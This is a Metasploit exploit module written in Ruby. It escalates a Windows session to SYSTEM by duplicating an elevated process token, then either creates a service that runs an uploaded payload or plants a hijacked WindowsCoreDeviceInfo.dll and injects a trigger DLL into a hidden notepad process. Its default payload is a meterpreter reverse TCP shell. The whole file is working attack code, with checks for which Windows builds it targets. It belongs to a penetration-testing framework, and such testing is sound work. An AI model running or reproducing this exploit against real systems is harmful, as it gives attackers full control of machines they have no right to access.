##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/post/windows/powershell'

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::Windows::Priv
  include Msf::Exploit::EXE # Needed for generate_payload_dll
  include Msf::Post::Windows::FileSystem
  include Msf::Post::Windows::ReflectiveDLLInjection
  include Msf::Exploit::FileDropper
  include Msf::Post::File
  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Post::Windows::Powershell

  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Microsoft Spooler Local Privilege Elevation Vulnerability',
        'Description' => %q{
          This "exploit" duplicates the token of an elevated prcess and impersonates it.
          The resulting process has nonstandard permissions, but can read/write to the
          filesystem and registry.  This module leverages that permission to create a service
          that runs as system.
        },
        'License' => MSF_LICENSE,
        'Author' =>
          [
            'James Forshaw', # Research
            'Ruben Boonen (@FuzzySec)', # PoC
            'bwatters-r7', # msf module
            'jheysel-r7' # msf module
          ],
        'Platform' => ['win'],
        'SessionTypes' => ['meterpreter'],
        'Targets' =>
          [
            [ 'Automatic', { 'Arch' => [ ARCH_X86, ARCH_X64 ] } ]
          ],
        'DefaultTarget' => 0,
        'DisclosureDate' => '2017-05-25',
        'References' =>
          [
            ['URL', 'https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/UAC-TokenMagic.ps1'],
            ['URL', 'https://tyranidslair.blogspot.co.uk/2017/05/reading-your-way-around-uac-part-1.html'],
            ['URL', 'https://tyranidslair.blogspot.co.uk/2017/05/reading-your-way-around-uac-part-2.html'],
            ['URL', 'https://tyranidslair.blogspot.co.uk/2017/05/reading-your-way-around-uac-part-3.html']
          ],
        'SideEffects' => [ ARTIFACTS_ON_DISK, SCREEN_EFFECTS ],
        'DefaultOptions' =>
          {
            'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp',
            'WfsDelay' => 900
          }
      )
    )

    register_options([
      OptString.new('SERVICE_NAME',
                    [false, 'Service Name to use (%RAND% by default).', Rex::Text.rand_text_alpha(5..9).to_s]),
      OptString.new('WRITABLE_DIR',
                    [false, 'Location of file to overwrite (%TEMP% by default).', nil]),
      OptString.new('SERVICE_FILENAME',
                    [false, 'Filename for Service Payload (%RAND% by default).', Rex::Text.rand_text_alpha(5..9).to_s]),
      OptString.new('METHOD',
                    [true, 'SERVICE or DLL, please select which attack method you would like to use (SERVICE by default).', 'SERVICE'])
    ])
  end

  def setup_process
    begin
      print_status('Launching notepad to host the exploit...')
      notepad_process = client.sys.process.execute('notepad.exe', nil, 'Hidden' => true)
      process = client.sys.process.open(notepad_process.pid, PROCESS_ALL_ACCESS)
      print_good("Process #{process.pid} launched.")
    rescue Rex::Post::Meterpreter::RequestError
      # Sandboxes could not allow to create a new process
      # stdapi_sys_process_execute: Operation failed: Access is denied.
      print_error('Operation failed. Trying to elevate the current process...')
      process = client.sys.process.open
    end
    process
  end

  def inject_magic(process)

    if sysinfo['Architecture'] == ARCH_X64
      library_path = ::File.join(Msf::Config.data_directory, 'exploits', 'uso_trigger', 'uso_trigger.x64.dll')
    elsif session.arch == ARCH_X86
      library_path = ::File.join(Msf::Config.data_directory, 'exploits', 'uso_trigger', 'uso_trigger.x86.dll')
    end

    library_path = ::File.expand_path(library_path)

    print_status("Reflectively injecting the trigger DLL into #{process.pid}...")
    dll = ''
    ::File.open(library_path, 'rb') { |f| dll = f.read }
    exploit_mem, offset = inject_dll_data_into_process(process, dll)
    vprint_status('Trigger injected.')
    payload_mem = inject_into_process(process, payload.encoded)
    print_status('Trigger injected. Starting thread...')
    process.thread.create(exploit_mem + offset, payload_mem)
  end

  def launch_dll_trigger
    begin
      print_status('Trying to start notepad')
      process = setup_process
      inject_magic(process)
      print_good('Exploit finished, wait for (hopefully privileged) payload execution to complete.')
    rescue Rex::Post::Meterpreter::RequestError => e
      elog(e)
      print_error(e.message)
    end
  end

  def start_dll_hijack(bin_path, cmd_path)
    # Read in Generic Script
    script = exploit_data('tokenmagic', 'tokenmagic.ps1')
    fail_with(Failure::BadConfig, 'No exploit script found') if script.nil?

    # Replace Values in Generic Script
    # We only need the powershell script to run one command..

    cmd_args = "/c move #{bin_path} C:\\Windows\\System32\\WindowsCoreDeviceInfo.dll"

    script.gsub!('_CMD_PATH_', cmd_path)
    script.gsub!('_CMD_ARGS_', cmd_args)

    # Run Exploit Script
    print_status("Running Exploit on #{sysinfo['Computer']}")
    begin
      print_status('Executing ')
      session.powershell.execute_string({ code: script })
    rescue Rex::TimeoutError => e
      elog('Caught timeout.  Exploit may be taking longer or it may have failed.', error: e)
      print_error('Caught timeout.  Exploit may be taking longer or it may have failed.')
    end

    print_status('Starting the interactive scan job...')
    launch_dll_trigger

    print_status('Enjoy the shell!')
  end

  def start_service(service_name, bin_path, cmd_path)
    # Read in Generic Script
    script = exploit_data('tokenmagic', 'tokenmagic.ps1')
    fail_with(Failure::BadConfig, 'No exploit script found') if script.nil?

    # Replace Value in Generic Script. Note Windows 7 requires spaces after the equal signs in the below command.
    cmd_args = "/c sc create #{service_name} binPath= #{bin_path} type= own start= demand && sc start #{service_name}"

    script.gsub!('_CMD_PATH_', cmd_path)
    script.gsub!('_CMD_ARGS_', cmd_args)

    # Run Exploit Script
    print_status("Running Exploit on #{sysinfo['Computer']}")
    begin
      session.powershell.execute_string({ code: script })
    rescue Rex::TimeoutError => e
      elog('Caught timeout.  Exploit may be taking longer or it may have failed.', error: e)
      print_error('Caught timeout.  Exploit may be taking longer or it may have failed.')
    end
  end

  def payload_arch
    if payload.arch.include?(ARCH_X64)
      return ARCH_X64
    else
      return ARCH_X86
    end
  end

  def exploit
    win_dir = session.sys.config.getenv('windir')
    cmd_path = "#{win_dir}\\system32\\cmd.exe"
    if datastore['SERVICE_FILENAME'].nil? || datastore['SERVICE_FILENAME'].empty?
      service_filename = Rex::Text.rand_text_alpha(5..9).to_s
    else
      service_filename = datastore['SERVICE_FILENAME']
    end
    service_filename = "#{service_filename}.exe" unless service_filename.end_with?('.exe')
    if datastore['SERVICE_NAME'].nil? || datastore['SERVICE_NAME'].empty?
      service_name = Rex::Text.rand_text_alpha(5..9).to_s
    else
      service_name = datastore['SERVICE_NAME']
    end
    if datastore['WRITABLE_DIR'].nil? || datastore['WRITABLE_DIR'].empty?
      writable_dir = session.sys.config.getenv('TEMP').to_s
    else
      writable_dir = datastore['WRITABLE_DIR']
    end

    if datastore['METHOD'] =~ /DLL/i
      bin_path = "#{writable_dir}\\WindowsCoreDeviceInfo.dll"
      payload_dll = generate_payload_dll
      print_status("Payload DLL is #{payload_dll.length} bytes long")
      client.core.use('powershell') if !client.ext.aliases.include?('powershell')

      # Check target
      vprint_status('Checking Target')
      validate_active_host
      validate_payload

      # Upload the payload
      print_status("Uploading payload to #{bin_path}")
      write_file(bin_path, payload_dll)
      register_file_for_cleanup(bin_path)
      register_file_for_cleanup('C:\\Windows\\System32\\WindowsCoreDeviceInfo.dll') # Register this file for cleanup so that if we fail, then the file is cleaned up.
      # Run the exploit
      _output = start_dll_hijack(bin_path, cmd_path)
      return
    end

    bin_path = "#{writable_dir}\\#{service_filename}"
    client.core.use('powershell') if !client.ext.aliases.include?('powershell')
    payload_exe = generate_payload_exe_service({ servicename: service_name, arch: payload_arch })

    # Debug info
    vprint_status("Service Name = #{service_name}")
    # Check target
    vprint_status('Checking Target')
    validate_active_host
    validate_payload

    # Upload the payload
    print_status("Uploading payload to #{bin_path}")
    write_file(bin_path, payload_exe)
    register_file_for_cleanup(bin_path)

    # Run the exploit
    _output = start_service(service_name, bin_path, cmd_path)
    sleep(5) # make sure exploit is finished- yes, this is suboptimal
  end

  def validate_active_host
    begin
      print_status("Attempting to PrivEsc on #{sysinfo['Computer']} via session ID: #{datastore['SESSION']}")
    rescue Rex::Post::Meterpreter::RequestError => e
      elog('Could not connect to session', error: e)
      raise Msf::Exploit::Failed, 'Could not connect to session'
    end
  end

  def validate_payload
    vprint_status("Target Arch = #{sysinfo['Architecture']}")
    vprint_status("Payload Arch = #{payload.arch.first}")
    unless payload.arch.first == sysinfo['Architecture']
      fail_with(Failure::BadConfig, 'Payload arch must match target arch')
    end
  end

  def check
    sysinfo_value = sysinfo['OS']
    build_num = sysinfo_value.match(/\w+\d+\w+(\d+)/)[0].to_i
    vprint_status("Build Number = #{build_num}")
    if datastore['METHOD'] =~ /service/i
      # Service method has been tested on Windows 7, 8 and 10 (1803 and ealier)
      return Exploit::CheckCode::Appears if ((sysinfo_value =~ /10/ && build_num <= 17134) || build_num >= 7600 && build_num <= 9600)
    elsif (sysinfo_value =~ /10/ && build_num <= 17134 && build_num >= 15063)
      # DLL method has been tested on Windows 10 (1703 to 1803)
      return Exploit::CheckCode::Appears
    end

    return Exploit::CheckCode::Safe
  end
end
